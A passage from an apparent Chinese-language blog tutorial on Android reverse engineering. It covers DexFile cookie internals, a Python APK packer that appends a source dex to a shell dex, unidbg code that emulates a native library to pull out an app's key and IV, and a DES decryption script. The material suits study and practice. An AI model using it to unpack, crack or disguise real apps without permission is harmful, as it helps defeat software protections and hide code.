dexFile)<br></code></pre></td></tr></table></figure><p>解决方法：</p><ol><li>传入null，查看对应源码，可以知道就是多了一步<code>class_linker-&gt;InsertDexFileInToClassLoader()</code>，顾名思义，应该是将DexFile文件加载到类加载器中，方便之后加载类。而加载类的过程我们自己实现了，应该不会有问题的。</li><li>刚刚上一小节说过，cookie这个其实就是个DexFile的首地址，那么我们就可以通过这个获取DexFile对象。</li></ol><p>为什么说cookie是地址呢，证据如下：</p><p><code>art/runtime/native/dalvik_system_DexFile.cc</code>目录下的<code>DexFile_defineClassNative</code>函数：</p><ul><li><p>Android 5.1 ：第一行就是调用<code>toDexFiles(cookie, env)</code>函数获取DexFile对象，而且该方法定义时，第一个参数名为dex_file_address。</p></li><li><p>Android 6 ~ ：第一行代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">`std::unique_ptr&lt;std::vector&lt;<span class="hljs-type">const</span> DexFile*&gt;&gt; dex_files = <span class="hljs-built_in">ConvertJavaArrayToNative</span>(env, cookie)`<br><br>CPP<br></code></pre></td></tr></table></figure><p>是吧，又是通过cookie得到DexFile对象！</p></li></ul><p>所以说，非常肯定cookie就是DexFile的首地址</p><p>加壳程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> zlib <span class="hljs-keyword">import</span> adler32<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> unhexlify<br><span class="hljs-keyword">import</span> zipfile<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fixCheckSum</span>(<span class="hljs-params">dexBytesArray</span>):<br>    <span class="hljs-comment"># dexfile[8:12]</span><br>    <span class="hljs-comment"># 小端存储</span><br>    value = adler32(<span class="hljs-built_in">bytes</span>(dexBytesArray[<span class="hljs-number">12</span>:]))<br>    valueArray = <span class="hljs-built_in">bytearray</span>(value.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(valueArray)):<br>        dexBytesArray[<span class="hljs-number">8</span> + i] = valueArray[i]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fixSignature</span>(<span class="hljs-params">dexBytesArray</span>):<br>    <span class="hljs-comment"># dexfile[12:32]</span><br>    sha_1 = sha1()<br>    sha_1.update(<span class="hljs-built_in">bytes</span>(dexBytesArray[<span class="hljs-number">32</span>:]))<br>    value = sha_1.hexdigest()<br>    valueArray = <span class="hljs-built_in">bytearray</span>(unhexlify(value))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(valueArray)):<br>        dexBytesArray[<span class="hljs-number">12</span> + i] = valueArray[i]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fixFileSize</span>(<span class="hljs-params">dexBytesArray, fileSize</span>):<br>    <span class="hljs-comment"># dexfile[32:36]</span><br>    <span class="hljs-comment"># 小端存储</span><br>    fileSizeArray = <span class="hljs-built_in">bytearray</span>(fileSize.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;little&quot;</span>))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fileSizeArray)):<br>        dexBytesArray[<span class="hljs-number">32</span> + i] = fileSizeArray[i]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypto</span>(<span class="hljs-params">file</span>):<br>    <span class="hljs-comment"># for i in range(len(file)):</span><br>    <span class="hljs-comment">#     file[i] ^= 0xff</span><br>    <span class="hljs-keyword">return</span> file<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readDexsSourceApk</span>(<span class="hljs-params">sourceApkPath</span>):<br>    dexList = []<br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(sourceApkPath, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> sourceApk:<br>        <span class="hljs-comment"># 获取apk中所有的文件路径名称</span><br>        nameList = sourceApk.namelist()<br>        <span class="hljs-keyword">for</span> fileName <span class="hljs-keyword">in</span> nameList:<br>            <span class="hljs-comment"># 提取dex文件</span><br>            <span class="hljs-keyword">if</span> fileName.endswith(<span class="hljs-string">&quot;.dex&quot;</span>):<br>                <span class="hljs-comment"># 解压缩到当前目录下 sourceApk.extract(fileName)</span><br>                <span class="hljs-comment"># 建议直接读取</span><br>                <span class="hljs-keyword">with</span> sourceApk.<span class="hljs-built_in">open</span>(fileName) <span class="hljs-keyword">as</span> dexfile:<br>                    data = <span class="hljs-built_in">bytearray</span>(dexfile.read())<br>                    dexList.append(data)<br>    <span class="hljs-keyword">return</span> dexList<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readDexFromShellApk</span>(<span class="hljs-params">shellApkPath</span>):<br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(shellApkPath, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> sourceApk:<br>        <span class="hljs-comment"># 获取apk中所有的文件路径名称</span><br>        nameList = sourceApk.namelist()<br>        <span class="hljs-keyword">for</span> fileName <span class="hljs-keyword">in</span> nameList:<br>            <span class="hljs-comment"># 提取dex文件</span><br>            <span class="hljs-keyword">if</span> fileName.endswith(<span class="hljs-string">&quot;.dex&quot;</span>):<br>                <span class="hljs-comment"># 建议直接读取</span><br>                <span class="hljs-keyword">with</span> sourceApk.<span class="hljs-built_in">open</span>(fileName) <span class="hljs-keyword">as</span> dexfile:<br>                    data = <span class="hljs-built_in">bytearray</span>(dexfile.read())<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">combineSourceDexs</span>(<span class="hljs-params">sourceDexList</span>):<br>    combinedDex = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> dexfile <span class="hljs-keyword">in</span> sourceDexList:<br>        dexfileLen = <span class="hljs-built_in">len</span>(dexfile)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(dexfileLen))<br>        <span class="hljs-comment"># 首先存放当前dex的大小，四字节，小端存储</span><br>        combinedDex += <span class="hljs-built_in">bytearray</span>(dexfileLen.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>        <span class="hljs-comment"># 然后存放当前dex</span><br>        combinedDex += dexfile<br>    <span class="hljs-keyword">return</span> combinedDex<br><span class="hljs-comment"># 待实现</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">forkShellLibIntoSourceApk</span>():<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    sourceApkPath = <span class="hljs-string">&quot;sourceApk.apk&quot;</span><br>    shellApkPath = <span class="hljs-string">&quot;shellApk.apk&quot;</span><br>    newApkPath = <span class="hljs-string">&quot;newApk.apk&quot;</span><br>    <span class="hljs-comment"># 读取源APK中的dex文件,可以接受多dex</span><br>    sourceDexList = readDexsSourceApk(sourceApkPath)<br>    <span class="hljs-comment"># 读取壳程序dex,只能有一个dex</span><br>    shellDex = readDexFromShellApk(shellApkPath)<br>    <span class="hljs-comment"># 合并源程序dex</span><br>    combineSourceDex = combineSourceDexs(sourceDexList)<br>    <span class="hljs-comment"># 加密源程序dex</span><br>    encSourceDex = encrypto(combineSourceDex)<br>    encSourceDexLen = <span class="hljs-built_in">len</span>(encSourceDex)<br>    <span class="hljs-comment"># 新的dex文件内容 = 壳dex + 加密的源dex + 四字节标识加密后源dex大小长度</span><br>    newDex = shellDex + encSourceDex + <span class="hljs-built_in">bytearray</span>(encSourceDexLen.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>    newDexLen = <span class="hljs-built_in">len</span>(newDex)<br>    <span class="hljs-comment"># 首先修改filesize</span><br>    fixFileSize(newDex, newDexLen)<br>    <span class="hljs-comment"># 其次修改signature</span><br>    fixSignature(newDex)<br>    <span class="hljs-comment"># 最后修改checksum</span><br>    fixCheckSum(newDex)<br>    <br>    <span class="hljs-comment"># 本想用代码实现替换apk中的dex（先删除再写入），但zipfile库没有现成的方法，还是算了</span><br>    <span class="hljs-comment"># 导出成新的dex文件</span><br>    <br>    <span class="hljs-comment"># 其实还有一个问题，就是需要把脱壳APK中的lib库复制过来！</span><br>    <span class="hljs-comment"># 待实现（解压缩，替换，再压缩？？？）</span><br>    <span class="hljs-comment"># forkShellLibIntoSourceApk()</span><br>    <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;classes.dex&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(<span class="hljs-built_in">bytes</span>(newDex))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    start()<br></code></pre></td></tr></table></figure><h4 id="调试手段"><a href="#调试手段" class="headerlink" title="调试手段"></a>调试手段</h4><h5 id="逆向工具之unidbg（在pc端模拟执行so文件中的函数）"><a href="#逆向工具之unidbg（在pc端模拟执行so文件中的函数）" class="headerlink" title="逆向工具之unidbg（在pc端模拟执行so文件中的函数）"></a>逆向工具之unidbg（在pc端模拟执行so文件中的函数）</h5><p>下载项目：<a href="https://github.com/zhkl0228/unidbg">https://github.com/zhkl0228/unidbg</a>   idea导入，设置为maven</p><p><img src="image-20240521211538793.png" alt="image-20240521211538793"></p><p>在类中执行</p><p><img src="image-20240521211655478.png" alt="image-20240521211655478"></p><p><img src="image-20240521212753303.png" alt="image-20240521212753303"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> re13;<br><br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.AndroidEmulatorBuilder;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.AndroidResolver;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.AbstractJni;<br><span class="hljs-keyword">import</span> com.github.unidbg.AndroidEmulator;<br><span class="hljs-keyword">import</span> com.github.unidbg.Module;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.*;<br><span class="hljs-keyword">import</span> com.github.unidbg.memory.Memory;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.DalvikModule;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.DvmClass;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.VM;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">re13</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractJni</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AndroidEmulator emulator;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> VM vm;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Module <span class="hljs-keyword">module</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Memory memory;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> DalvikModule dm;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">re13</span><span class="hljs-params">(String apkFilePath, String soFilePath, String apkProcessname)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        emulator = AndroidEmulatorBuilder.for64Bit().setProcessName(apkProcessname).build();<br>        memory = emulator.getMemory();<br>        memory.setLibraryResolver(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AndroidResolver</span>(<span class="hljs-number">23</span>));<br>        vm = emulator.createDalvikVM(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(apkFilePath));<br>        vm.setVerbose(<span class="hljs-literal">false</span>);<br>        dm = vm.loadLibrary(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(soFilePath), <span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">module</span> = dm.getModule();<br>        vm.setJni(<span class="hljs-built_in">this</span>);<br>        dm.callJNI_OnLoad(emulator);<br>        vm.setVerbose(<span class="hljs-literal">true</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">re13</span><span class="hljs-params">(AndroidEmulator emulator, VM vm, Module <span class="hljs-keyword">module</span>, Memory memory, DalvikModule dm)</span> &#123;<br>        <span class="hljs-built_in">this</span>.emulator = emulator;<br>        <span class="hljs-built_in">this</span>.vm = vm;<br>        <span class="hljs-built_in">this</span>.<span class="hljs-keyword">module</span> = <span class="hljs-keyword">module</span>;<br>        <span class="hljs-built_in">this</span>.memory = memory;<br>        <span class="hljs-built_in">this</span>.dm = dm;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">GETKEY</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">DvmClass</span> <span class="hljs-variable">dvmClass</span> <span class="hljs-operator">=</span> vm.resolveClass(<span class="hljs-string">&quot;com.example.re11113.jni&quot;</span>);<br>        DvmObject&lt;?&gt; object = dvmClass.newObject(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">DvmObject</span> <span class="hljs-variable">object1</span> <span class="hljs-operator">=</span> object.callJniMethodObject(emulator, <span class="hljs-string">&quot;getkey()Ljava/lang/String;&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">resultValue</span> <span class="hljs-operator">=</span> object1.getValue().toString();<br>        <span class="hljs-keyword">return</span> resultValue;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">GETIV</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">DvmClass</span> <span class="hljs-variable">dvmClass</span> <span class="hljs-operator">=</span> vm.resolveClass(<span class="hljs-string">&quot;com.example.re11113.jni&quot;</span>);<br>        DvmObject&lt;?&gt; object = dvmClass.newObject(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">DvmObject</span> <span class="hljs-variable">object1</span> <span class="hljs-operator">=</span> object.callJniMethodObject(emulator, <span class="hljs-string">&quot;getiv()Ljava/lang/String;&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">resultValue</span> <span class="hljs-operator">=</span> object1.getValue().toString();<br>        <span class="hljs-keyword">return</span> resultValue;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">soFilePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\HEXIXI\\Desktop\\unidbg-master\\so\\libSecret_entrance.so&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">apkFilePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\HEXIXI\\Desktop\\unidbg-master\\so\\app-debug.apk&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">apkProcessname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.tencent.callre2&quot;</span>;<br>        <span class="hljs-comment">//创建一个实例</span><br>        <span class="hljs-type">re13</span> <span class="hljs-variable">re2app</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">re13</span>(apkFilePath, soFilePath, apkProcessname);<br>        <span class="hljs-comment">//解出key和iv</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">KEY</span> <span class="hljs-operator">=</span> re2app.GETKEY();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">IV</span> <span class="hljs-operator">=</span> re2app.GETIV();<br>        System.out.println(<span class="hljs-string">&quot;getKeyresult: &quot;</span> + KEY);<br>        System.out.println(<span class="hljs-string">&quot;getivresult: &quot;</span> + IV);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>DES</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_des_decrypt</span>(<span class="hljs-params">encrypted_data, secret_key, initialization_vector</span>):<br>    <span class="hljs-comment"># 解码base64编码的密文</span><br>    encrypted_bytes = base64.b64decode(encrypted_data)<br>    key_bytes = secret_key.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    iv_bytes = initialization_vector.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 创建DES解密器</span><br>    cipher = DES.new(key_bytes, DES.MODE_CBC, iv_bytes)<br>    <br>    <span class="hljs-comment"># 解密数据并去除填充</span><br>    decrypted_bytes = unpad(cipher.decrypt(encrypted_bytes), DES.block_size)<br>    decrypted_text = decrypted_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <br>    <span class="hljs-keyword">return</span> decrypted_text<br><br><span class="hljs-comment"># 示例用法</span><br>encrypted_data = <span class="hljs-string">&#x27;JqslHrdvtgJrRs2QAp+FEVdwRPNLswrnykD/sZMivmjGRKUMVIC/rw==&#x27;</span><br>secret_key = <span class="hljs-string">&#x27;A8UdWaeq&#x27;</span>  <span class="hljs-comment"># 这里是你的8字节的key</span><br>initialization_vector = <span class="hljs-string">&#x27;Wf3DLups&#x27;</span>  <span class="hljs-comment"># 这里是你的8字节的初始向量</span><br><br>decrypted_text = custom_des_decrypt(encrypted_data, secret_key, initialization_vector)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted text:&quot;</span>, decrypted_text)<br><br></code></pre></td></tr></table></figure><p>尝试</p><p><img src="image-20240724202627427.png" alt="image-20240724202627427"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.dta.lesson2;<br><br><span class="hljs-keyword">import</span> com.github.unidbg.AndroidEmulator;<br><span class="hljs-keyword">import</span> com.github.unidbg.LibraryResolver;<br><span class="hljs-keyword">import</span> com.github.unidbg.arm.backend.DynarmicFactory;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.AndroidEmulatorBuilder;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.AndroidResolver;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.*;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject;<br><span class="hljs-keyword">import</span> com.github.unidbg.memory.Memory;<br><span class="hljs-keyword">import</span> com.github.unidbg.Module;<br><span class="hljs-keyword">import</span> com.sun.jna.Pointer;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AndroidEmulator emulator;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> VM vm;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Module <span class="hljs-keyword">module</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">MainActivity</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 创建模拟器实例，要模拟32位或者64位，在这里区分</span><br>        emulator = AndroidEmulatorBuilder<br>                <span class="hljs-comment">// 指定32位CPU</span><br>                .for32Bit()<br>                <span class="hljs-comment">// 添加后端， 推荐使用Dynarmic，运行速度快，但是不支持某些新特性</span><br>                .addBackendFactory(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DynarmicFactory</span>(<span class="hljs-literal">true</span>))<br>                <span class="hljs-comment">// 指定进程名，推荐以安卓包名做进程名</span><br>                <span class="hljs-comment">// .setProcessName(&quot;&quot;)</span><br>                .build();<br>        <span class="hljs-comment">// 模拟器的内存操作接口</span><br>        <span class="hljs-type">Memory</span> <span class="hljs-variable">memory</span> <span class="hljs-operator">=</span> emulator.getMemory();<br>        <span class="hljs-comment">// 设置SDK版本</span><br>        <span class="hljs-type">LibraryResolver</span> <span class="hljs-variable">resolver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AndroidResolver</span>(<span class="hljs-number">23</span>);<br>        <span class="hljs-comment">// 设置系统类库解析</span><br>        memory.setLibraryResolver(resolver);<br>        <span class="hljs-comment">// 创建Android虚拟机</span><br>        vm = emulator.createDalvikVM(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\HEXIXI\\Desktop\\libnative-lib\\app-debug.apk&quot;</span>));<br>        <span class="hljs-comment">// 设置是否打印Jni调用细节</span><br>        vm.setVerbose(<span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// 加载libnative-lib.so到unicorn虚拟内存，加载成功以后会默认调用init_array等函数</span><br>        <span class="hljs-type">DalvikModule</span> <span class="hljs-variable">dm</span> <span class="hljs-operator">=</span> vm.loadLibrary(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\HEXIXI\\Desktop\\libnative-lib\\libnative-lib.so&quot;</span>), <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">//获取本SO模块的句柄,后续需要用它</span><br>        <span class="hljs-keyword">module</span> = dm.getModule();<br>        <span class="hljs-comment">// 调用JNI OnLoad</span><br>        dm.callJNI_OnLoad(emulator);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">md5</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">/* 符号调用</span><br><span class="hljs-comment">        创建项目要和包名一致, 因为unidbg会根据this的包名进行匹配JNI方法,所以this所属类的包名应该与目标函数相同(com.dta.lesson2)</span><br><span class="hljs-comment">        例如这里this的包名是com.dta.lesson2,那么就相当于调用Java_com_dta_lesson2_md5(JNIEnv *env, jobject thiz, jstring str);</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">DvmClass</span> <span class="hljs-variable">dvmClass</span> <span class="hljs-operator">=</span> vm.resolveClass(<span class="hljs-string">&quot;com.dta.lesson2.MainActivity&quot;</span>);<br>        DvmObject&lt;?&gt; object = dvmClass.newObject(<span class="hljs-literal">null</span>);<br>        <span 